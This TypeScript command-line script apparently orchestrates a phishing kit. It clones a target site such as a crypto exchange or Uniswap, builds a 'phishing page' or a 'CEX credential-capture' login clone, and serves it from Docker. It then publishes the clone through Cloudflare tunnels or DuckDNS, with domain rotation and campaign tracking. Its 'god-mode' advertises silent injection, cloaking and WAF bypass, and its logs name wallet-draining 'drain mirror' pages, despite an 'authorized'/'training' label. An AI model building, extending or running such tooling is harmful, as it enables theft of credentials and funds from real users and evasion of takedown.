/**
 * Authorized mirror — generate clone, start Docker nginx, expose via Cloudflare tunnel.
 *
 * Usage:
 *   pnpm clone-tunnel https://example.com
 *   pnpm clone-tunnel --god-mode --force https://example.com
 *   pnpm clone-tunnel --god-mode --subdomain myclone https://example.com
 *
 * --force skips CEX auto-detection and WAF abort. When DNSHE API is unreachable
 * (network block), --force continues to quick tunnel (trycloudflare) or DuckDNS.
 *   pnpm clone-tunnel --rotate --campaign-id <uuid> https://example.com
 *
 * Requires: pnpm, tsx, Docker, cloudflared on PATH.
 * Optional: DNSHE_TOKEN + DNSHE_BASE_DOMAIN (god-mode auto subdomain discovery),
 *           DUCKDNS_TOKEN, CLOUDFLARE_API_TOKEN + CLOUDFLARE_ZONE_ID for fixed domains.
 * On success prints only the public URL to stdout.
 */
import { spawn } from 'node:child_process'
import { existsSync, readFileSync } from 'node:fs'
import { access, writeFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import {
  findCampaignByTargetDomain,
  updateCampaignMirrorById,
} from './lib/clone-tunnel-campaign.js'
import {
  createCloudflareMirrorSubdomain,
  hasCloudflareDnsConfig,
  hasDuckDnsConfig,
  readRotateIntervalHours,
  resolveDuckDnsMirrorUrl,
} from './lib/clone-tunnel-dns.js'
import { provisionMirrorDnsWithFallback } from './lib/clone-tunnel-dnshe.js'
import type { RotationState } from './lib/clone-tunnel-rotation-worker.js'
import {
  buildGeneratorArgv,
  buildGeneratorEnv,
  DEFAULT_BACKEND_URL,
} from './lib/mirror-god-mode.js'
import {
  fetchTargetHomepageHtml,
  isCexDomain,
  runMirrorProbePipeline,
  shouldUseCexClone,
} from './lib/mirror-target-pipeline.js'
import { writeCexStaticServeFiles } from './lib/cex-clone-lib.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')
const BACKEND_URL = process.env['BACKEND_URL']?.trim() || DEFAULT_BACKEND_URL
const MIRROR_PORT = 8080
const GENERATE_TIMEOUT_MS = 180_000
const DOCKER_HEALTH_TIMEOUT_MS = 120_000
/** Minimum wait for cloudflared quick-tunnel URL on stdout/stderr. */
const QUICK_TUNNEL_CAPTURE_MS = 30_000
/** Extended ceiling when URL has not appeared yet. */
const TUNNEL_TIMEOUT_MS = 90_000
const TRYCF_URL_PATTERNS = [
  /https:\/\/[a-z0-9][-a-z0-9]{0,127}\.trycloudflare\.com\/?/gi,
  /https:\/\/[^\s"'<>|]+\.trycloudflare\.com/gi,
]
const PUBLIC_URL_RE =
  /^https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9.-]+\.[a-z]{2,})\/?$/i

function loadEnvFile(filePath: string): void {
  if (!existsSync(filePath)) return
  const content = readFileSync(filePath, 'utf8')
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eq = trimmed.indexOf('=')
    if (eq <= 0) continue
    const key = trimmed.slice(0, eq).trim()
    let value = trimmed.slice(eq + 1).trim()
    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1)
    }
    if (process.env[key] === undefined) {
      process.env[key] = value
    }
  }
}

loadEnvFile(path.join(REPO_ROOT, '.env'))
loadEnvFile(path.join(REPO_ROOT, '.env.development'))

interface CliArgs {
  targetUrl: string
  subdomain?: string
  godMode: boolean
  rotate: boolean
  rotateHours: number
  campaignId?: string
  forceHardwareBypass: boolean
  force: boolean
}

function fail(message: string): never {
  console.error(`[clone-tunnel] ${message}`)
  process.exit(1)
}

function parseArgs(argv: string[]): CliArgs {
  const args = [...argv]
  let subdomain: string | undefined
  let godMode = false
  let rotate = false
  let rotateHours = readRotateIntervalHours()
  let campaignId: string | undefined
  let forceHardwareBypass = false
  let force = false

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!
    if (arg === '--god-mode') {
      godMode = true
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--force') {
      force = true
      args.splice(i, 1)
      i--
    } else if (arg === '--rotate') {
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--force-hardware-bypass') {
      forceHardwareBypass = true
      args.splice(i, 1)
      i--
    } else if (arg === '--subdomain') {
      subdomain = args[i + 1]?.trim().toLowerCase().replace(/[^a-z0-9-]/g, '')
      if (!subdomain) fail('--subdomain requires a name (e.g. --subdomain legionmirror)')
      args.splice(i, 2)
      i--
    } else if (arg === '--rotate-hours') {
      const n = Number.parseInt(args[i + 1]?.trim() ?? '', 10)
      if (!Number.isFinite(n) || n <= 0) fail('--rotate-hours requires a positive number')
      rotateHours = n
      args.splice(i, 2)
      i--
    } else if (arg === '--campaign-id') {
      campaignId = args[i + 1]?.trim()
      if (!campaignId) fail('--campaign-id requires a UUID')
      args.splice(i, 2)
      i--
    }
  }

  if (godMode) forceHardwareBypass = true

  const raw = args[0]?.trim()
  if (!raw) {
    fail(
      'Usage: pnpm clone-tunnel [--god-mode] [--force] [--rotate] [--subdomain <name>] [--campaign-id <uuid>] <target-url>\n' +
        'Example: pnpm clone-tunnel --god-mode --subdomain myclone https://app.uniswap.org',
    )
  }

  const withScheme = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`
  try {
    const url = new URL(withScheme)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      fail(`Unsupported protocol: ${url.protocol}`)
    }
    return { targetUrl: url.href, subdomain, godMode, rotate, rotateHours, campaignId, forceHardwareBypass, force }
  } catch {
    fail(`Invalid target URL: ${raw}`)
  }
}

function runCommand(
  command: string,
  args: string[],
  opts?: { cwd?: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      cwd: opts?.cwd ?? REPO_ROOT,
      env: opts?.env ?? process.env,
      shell: process.platform === 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    })

    let stdout = ''
    let stderr = ''
    const timer =
      opts?.timeoutMs != null
        ? setTimeout(() => {
            child.kill('SIGTERM')
          }, opts.timeoutMs)
        : null

    child.stdout?.on('data', (chunk: Buffer) => {
      stdout += chunk.toString()
    })
    child.stderr?.on('data', (chunk: Buffer) => {
      stderr += chunk.toString()
    })
    child.on('error', (err) => {
      if (timer) clearTimeout(timer)
      reject(err)
    })
    child.on('close', (code) => {
      if (timer) clearTimeout(timer)
      if (code === 0) {
        resolve({ stdout, stderr })
        return
      }
      const detail = (stderr || stdout).trim().slice(0, 800)
      reject(new Error(detail || `${command} exited with code ${String(code)}`))
    })
  })
}

function stripAnsi(text: string): string {
  return text.replace(/\x1B\[[0-9;]*[A-Za-z]/g, '').replace(/\r/g, '')
}

async function fetchCloudflaredMetricsUrl(): Promise<string | null> {
  const metricsPort = process.env['CLOUDFLARED_METRICS_PORT']?.trim() || '4040'
  const url = `http://127.0.0.1:${metricsPort}/api/tunnels`
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(5_000) })
    if (!res.ok) return null
    const json = (await res.json()) as {
      tunnels?: Array<{ public_url?: string; url?: string }>
    }
    const tunnels = json.tunnels ?? []
    for (const t of tunnels) {
      const raw = t.public_url ?? t.url
      if (raw && raw.includes('trycloudflare.com')) {
        return raw.replace(/\/$/, '')
      }
    }
  } catch {
    /* metrics API unavailable */
  }
  return null
}

function extractTrycloudflareUrl(output: string): string | null {
  const clean = stripAnsi(output)
  for (const pattern of TRYCF_URL_PATTERNS) {
    pattern.lastIndex = 0
    const matches = clean.match(pattern)
    if (matches?.length) {
      const url = matches[matches.length - 1]!.replace(/\/$/, '')
      if (url.startsWith('https://') && url.includes('.trycloudflare.com')) {
        return url
      }
    }
  }
  const loose = clean.match(/https:\/\/[^\s]+trycloudflare\.com[^\s]*/i)
  if (loose?.[0]) {
    return loose[0].replace(/[|)\]},.;]+$/, '').replace(/\/$/, '')
  }
  return null
}

function randomDuckSubdomain(): string {
  const fromEnv = process.env['DUCKDNS_SUBDOMAIN']?.trim()
  if (fromEnv) return fromEnv
  return `legion-${Math.random().toString(36).slice(2, 8)}`
}

async function tryDuckDnsCloudflaredTunnel(): Promise<string> {
  if (!hasDuckDnsConfig()) {
    throw new Error('DUCKDNS_TOKEN not set — cannot fall back from quick tunnel')
  }
  const sub = randomDuckSubdomain()
  const duck = await resolveDuckDnsMirrorUrl(sub)
  if (!duck.ok) {
    throw new Error(`DuckDNS update failed: ${duck.detail}`)
  }
  console.error(`[clone-tunnel] DuckDNS fallback: ${duck.fqdn} — starting cloudflared --hostname`)
  return startCloudflaredTunnel(duck.fqdn)
}

async function startQuickTunnelWithFallback(): Promise<string> {
  try {
    return await startCloudflaredTunnel()
  } catch (quickErr) {
    const msg = quickErr instanceof Error ? quickErr.message : String(quickErr)
    console.error(`[clone-tunnel] Quick tunnel failed: ${msg}`)
    if (hasDuckDnsConfig()) {
      console.error('[clone-tunnel] Trying DuckDNS + cloudflared --hostname fallback')
      return tryDuckDnsCloudflaredTunnel()
    }
    throw new Error(
      `${msg}\n` +
        'Quick tunnel failed. Set DUCKDNS_TOKEN (and optional DUCKDNS_SUBDOMAIN) for hostname fallback, ' +
        'or ensure cloudflared is on PATH and can reach trycloudflare.com.',
    )
  }
}

async function generateCexClone(
  targetUrl: string,
  outDir: string,
): Promise<void> {
  const generator = path.join(REPO_ROOT, 'scripts', 'generate-cex-login-page.ts')
  await access(generator).catch(() => fail(`CEX generator not found: ${generator}`))

  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    PHISHING_TRAINING_MODE: 'true',
    BACKEND_URL: BACKEND_URL,
  }

  try {
    await runCommand(
      'pnpm',
      ['exec', 'tsx', generator, '--authorized', targetUrl, outDir],
      { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS },
    )
  } catch (e) {
    fail(`CEX clone generation failed: ${e instanceof Error ? e.message : String(e)}`)
  }

  await writeCexStaticServeFiles(outDir, MIRROR_PORT)
  await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
    fail(`CEX generation finished but docker-compose.yml missing in ${outDir}`),
  )
}

async function generateClone(
  targetUrl: string,
  outDir: string,
  godMode: boolean,
  forceHardwareBypass: boolean,
  pipeline?: Awaited<ReturnType<typeof runMirrorProbePipeline>>,
): Promise<void> {
  const generator = path.join(REPO_ROOT, 'scripts', 'generate-phishing-page.ts')
  await access(generator).catch(() => fail(`Generator not found: ${generator}`))
  const args = buildGeneratorArgv(targetUrl, outDir, BACKEND_URL, godMode, generator, {
    forceHardwareBypass,
  })
  const childEnv = buildGeneratorEnv(godMode, { forceHardwareBypass })
  if (pipeline?.cookies) {
    childEnv['MIRROR_PROXY_COOKIES'] = pipeline.cookies
  }

  try {
    await runCommand('pnpm', args, { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS })
  } catch (e) {
    fail(`Generation failed: ${e instanceof Error ? e.message : String(e)}`)
  }

  await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
    fail(`Generation finished but docker-compose.yml missing in ${outDir}`),
  )
}

async function resolveCloneGeneration(
  cli: CliArgs,
  outDir: string,
): Promise<'mirror' | 'cex'> {
  const target = new URL(cli.targetUrl)
  await import('node:fs/promises').then((fs) => fs.mkdir(outDir, { recursive: true }))

  const homepageHtml = await fetchTargetHomepageHtml(target)
  if (!cli.force && shouldUseCexClone(target, homepageHtml)) {
    console.error(
      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
    )
    await generateCexClone(cli.targetUrl, outDir)
    return 'cex'
  }

  const pipeline = await runMirrorProbePipeline(target, outDir, { force: cli.force })

  if (!cli.force && pipeline.strategy === 'cex') {
    console.error(
      '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
    )
    await generateCexClone(cli.targetUrl, outDir)
    return 'cex'
  }

  if (!cli.force && !pipeline.probeOk && !pipeline.html) {
    if (isCexDomain(target.hostname) || (pipeline.html && shouldUseCexClone(target, pipeline.html))) {
      console.error(
        '[clone-tunnel] WAF blocked mirror — falling back to CEX credential capture mode.',
      )
      await generateCexClone(cli.targetUrl, outDir)
      return 'cex'
    }
    fail(
      `WAF probe failed after headless retry: ${pipeline.detail ?? 'unknown'}. Pass --force to attempt raw mirror anyway.`,
    )
  }

  if (cli.force) {
    process.env['MIRROR_FORCE_RAW'] = 'true'
  }

  await generateClone(cli.targetUrl, outDir, cli.godMode, cli.forceHardwareBypass, pipeline)
  return 'mirror'
}

async function freeMirrorPort(): Promise<void> {
  try {
    const { stdout } = await runCommand(
      'docker',
      ['ps', '-q', '--filter', `publish=${MIRROR_PORT}`],
      { timeoutMs: 15_000 },
    )
    const ids = stdout.split(/\r?\n/).map((l) => l.trim()).filter(Boolean)
    for (const id of ids) {
      try {
        await runCommand('docker', ['stop', id], { timeoutMs: 30_000 })
      } catch {
        /* continue */
      }
    }
  } catch {
    /* no conflicting container */
  }
}

async function startDockerCompose(outDir: string): Promise<void> {
  await freeMirrorPort()

  try {
    await runCommand('docker', ['compose', 'down'], { cwd: outDir, timeoutMs: 30_000 })
  } catch {
    /* first run */
  }

  try {
    await runCommand('docker', ['compose', 'up', '-d'], { cwd: outDir, timeoutMs: 120_000 })
  } catch (e) {
    fail(`docker compose up failed: ${e instanceof Error ? e.message : String(e)}`)
  }
}

async function waitForMirrorReady(): Promise<void> {
  const deadline = Date.now() + DOCKER_HEALTH_TIMEOUT_MS

  while (Date.now() < deadline) {
    try {
      const res = await fetch(`http://127.0.0.1:${MIRROR_PORT}/`, {
        signal: AbortSignal.timeout(8_000),
      })
      if (res.ok || res.status === 404) return
    } catch {
      /* nginx still starting */
    }
    await new Promise((r) => setTimeout(r, 2_000))
  }

  fail(`Timed out waiting for mirror on http://127.0.0.1:${MIRROR_PORT}/`)
}

function startCloudflaredTunnel(hostname?: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const args = [
      'tunnel',
      '--no-autoupdate',
      '--url',
      `http://127.0.0.1:${MIRROR_PORT}`,
    ]
    if (hostname) args.push('--hostname', hostname)

    const child = spawn('cloudflared', args, {
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe'],
      shell: false,
      windowsHide: true,
    })

    let combined = ''
    let settled = false
    let softTimer: ReturnType<typeof setTimeout> | null = null
    let hardTimer: ReturnType<typeof setTimeout> | null = null

    const clearTimers = () => {
      if (softTimer) clearTimeout(softTimer)
      if (hardTimer) clearTimeout(hardTimer)
      softTimer = null
      hardTimer = null
    }

    const finish = (url: string) => {
      if (settled) return
      settled = true
      clearTimers()
      child.unref()
      resolve(url.replace(/\/$/, ''))
    }

    const failTunnel = (detail: string) => {
      if (settled) return
      settled = true
      clearTimers()
      try {
        child.kill('SIGTERM')
      } catch {
        /* ignore */
      }
      const snippet = stripAnsi(combined).trim().slice(-800)
      reject(
        new Error(
          snippet ? `${detail}\ncloudflared output (tail):\n${snippet}` : detail,
        ),
      )
    }

    const onData = (chunk: Buffer) => {
      combined += chunk.toString('utf8')
      const trycfUrl = extractTrycloudflareUrl(combined)
      if (trycfUrl) finish(trycfUrl)
    }

    child.stdout?.on('data', onData)
    child.stderr?.on('data', onData)
    child.on('error', (err) => failTunnel(err.message))
    child.on('exit', (code) => {
      if (settled) return
      if (code != null && code !== 0) {
        failTunnel(`cloudflared exited with code ${code}`)
      }
    })

    if (hostname) {
      hardTimer = setTimeout(() => finish(`https://${hostname}`), 12_000)
      return
    }

    softTimer = setTimeout(() => {
      const early = extractTrycloudflareUrl(combined)
      if (early) {
        finish(early)
        return
      }
      console.error(
        `[clone-tunnel] Waiting for trycloudflare URL (${QUICK_TUNNEL_CAPTURE_MS / 1000}s elapsed, up to ${TUNNEL_TIMEOUT_MS / 1000}s)…`,
      )
    }, QUICK_TUNNEL_CAPTURE_MS)

    hardTimer = setTimeout(() => {
      void (async () => {
        const late = extractTrycloudflareUrl(combined)
        if (late) {
          finish(late)
          return
        }
        const metricsUrl = await fetchCloudflaredMetricsUrl()
        if (metricsUrl) {
          console.error(`[clone-tunnel] Resolved tunnel URL via cloudflared metrics API: ${metricsUrl}`)
          finish(metricsUrl)
          return
        }
        failTunnel('cloudflared did not return a public URL (stdout/stderr and metrics API)')
      })()
    }, TUNNEL_TIMEOUT_MS)
  })
}

async function resolveDnsMirrorUrl(
  opts: {
    rotate: boolean
    godMode: boolean
    targetUrl: string
    subdomain?: string
  },
): Promise<{ url: string; fqdn?: string; provider: string; recordId?: string }> {
  if (opts.godMode) {
    const dns = await provisionMirrorDnsWithFallback(opts.targetUrl, {
      duckSubdomain: opts.subdomain,
    })
    if (dns.ok && dns.useQuickTunnel) {
      const quickUrl = await startQuickTunnelWithFallback()
      return { url: quickUrl, provider: 'trycloudflare' }
    }
    if (dns.ok && dns.fqdn) {
      try {
        const tunnelUrl = await startCloudflaredTunnel(dns.fqdn)
        return {
          url: tunnelUrl,
          fqdn: dns.fqdn,
          provider: dns.provider,
          recordId: dns.recordId,
        }
      } catch (e) {
        console.error(
          `[clone-tunnel] cloudflared --hostname ${dns.fqdn} failed: ${e instanceof Error ? e.message : String(e)} — quick tunnel`,
        )
        const quickUrl = await startQuickTunnelWithFallback()
        return { url: quickUrl, provider: 'trycloudflare' }
      }
    }
    if (!dns.ok) {
      console.error(`[clone-tunnel] DNS provisioning failed: ${dns.detail} — quick tunnel`)
      const quickUrl = await startQuickTunnelWithFallback()
      return { url: quickUrl, provider: 'trycloudflare' }
    }
  }

  if (opts.rotate && hasCloudflareDnsConfig()) {
    const created = await createCloudflareMirrorSubdomain()
    if (created.ok) {
      console.error(`[clone-tunnel] Cloudflare DNS: ${created.mirrorUrl}`)
      return {
        url: created.mirrorUrl.replace(/\/$/, ''),
        fqdn: created.fqdn,
        provider: 'cloudflare',
        recordId: created.recordId,
      }
    }
    console.error(`[clone-tunnel] Cloudflare DNS failed: ${created.detail} — trying DuckDNS`)
  }

  if (opts.subdomain && hasDuckDnsConfig()) {
    const duck = await resolveDuckDnsMirrorUrl(opts.subdomain)
    if (duck.ok) {
      console.error(`[clone-tunnel] DuckDNS: ${duck.mirrorUrl}`)
      return { url: duck.mirrorUrl.replace(/\/$/, ''), fqdn: duck.fqdn, provider: 'duckdns' }
    }
    console.error(`[clone-tunnel] DuckDNS failed: ${duck.detail}`)
  }

  if (opts.subdomain) {
    const fqdn = `${opts.subdomain}.duckdns.org`
    try {
      const tunnelUrl = await startCloudflaredTunnel(fqdn)
      return { url: tunnelUrl, fqdn, provider: 'duckdns+cloudflared' }
    } catch (e) {
      console.error(
        `[clone-tunnel] cloudflared --hostname ${fqdn} failed: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  const quickUrl = await startQuickTunnelWithFallback()
  return { url: quickUrl, provider: 'trycloudflare' }
}

async function updateCampaignDb(
  opts: CliArgs,
  mirrorUrl: string,
  fqdn?: string,
): Promise<string | undefined> {
  let campaignId = opts.campaignId
  if (!campaignId) {
    const found = await findCampaignByTargetDomain(opts.targetUrl)
    campaignId = found?.id
  }
  if (!campaignId) return undefined

  const updated = await updateCampaignMirrorById(campaignId, {
    mirror_url: `${mirrorUrl}/`,
    mirror_subdomain: fqdn ?? null,
    auto_rotate: opts.rotate,
    rotation_interval_hours: opts.rotateHours,
  })
  if (updated.ok === false) {
    console.error(`[clone-tunnel] Campaign update failed: ${updated.detail}`)
  } else {
    console.error(`[clone-tunnel] Campaign ${campaignId} mirror_url updated`)
  }
  return campaignId
}

function spawnRotationWorker(
  outDir: string,
  state: RotationState,
): void {
  const statePath = path.join(outDir, '.legion-rotate-state.json')
  const workerScript = path.join(REPO_ROOT, 'scripts', 'lib', 'clone-tunnel-rotation-worker.ts')
  const envFile = path.join(REPO_ROOT, '.env')
  const envFlag = existsSync(envFile) ? `--env-file=${envFile}` : ''

  const child = spawn(
    'pnpm',
    ['exec', 'tsx', envFlag, workerScript, '--state', statePath].filter(Boolean),
    {
      cwd: REPO_ROOT,
      detached: true,
      stdio: 'ignore',
      shell: process.platform === 'win32',
      env: process.env,
    },
  )
  child.unref()
  console.error(
    `[clone-tunnel] Rotation worker spawned (every ${state.intervalHours}h) — pid ${child.pid ?? 'unknown'}`,
  )
}

async function main(): Promise<void> {
  const cli = parseArgs(process.argv.slice(2))
  const stamp = new Date().toISOString().replace(/[:.]/g, '-')
  const outDir = path.join(REPO_ROOT, 'clones', `tunnel-${stamp}`)

  if (cli.godMode) {
    console.error('[clone-tunnel] God-mode: silent inject, cloaking, WAF bypass, asset rewrite, experimental stubs')
  }
  if (cli.force) {
    console.error('[clone-tunnel] --force: bypassing CEX auto-detection and WAF abort')
  }

  const mode = await resolveCloneGeneration(cli, outDir)
  if (mode === 'cex') {
    console.error('[clone-tunnel] Deploying CEX credential-capture static clone')
  }
  await startDockerCompose(outDir)
  await waitForMirrorReady()

  let publicUrl: string
  let fqdn: string | undefined
  let recordId: string | undefined
  let provider = 'trycloudflare'

  const dns = await resolveDnsMirrorUrl({
    rotate: cli.rotate,
    godMode: cli.godMode,
    targetUrl: cli.targetUrl,
    subdomain: cli.subdomain,
  })
  publicUrl = dns.url
  fqdn = dns.fqdn
  recordId = dns.recordId
  provider = dns.provider

  if (provider === 'cloudflare' || provider === 'duckdns') {
    console.error(
      `[clone-tunnel] DNS mirror at ${publicUrl} — ensure port ${MIRROR_PORT} is reachable on VPS`,
    )
  }

  if (!PUBLIC_URL_RE.test(publicUrl)) {
    fail(`Invalid public URL: ${publicUrl}`)
  }

  const campaignId = await updateCampaignDb(cli, publicUrl, fqdn)

  if (cli.rotate && (provider === 'cloudflare' || provider === 'duckdns')) {
    const state: RotationState = {
      campaignId,
      targetUrl: cli.targetUrl,
      intervalHours: cli.rotateHours,
      provider: provider === 'cloudflare' ? 'cloudflare' : 'duckdns',
      duckdnsSubdomain: cli.subdomain,
      lastRecordId: recordId,
      lastMirrorUrl: `${publicUrl}/`,
      lastFqdn: fqdn ?? publicUrl.replace(/^https:\/\//, ''),
      startedAt: new Date().toISOString(),
    }
    const statePath = path.join(outDir, '.legion-rotate-state.json')
    await writeFile(statePath, `${JSON.stringify(state, null, 2)}\n`, 'utf8')
    spawnRotationWorker(outDir, state)
  }

  process.stdout.write(`${publicUrl}\n`)
}

main().catch((e) => {
  fail(e instanceof Error ? e.message : String(e))
})
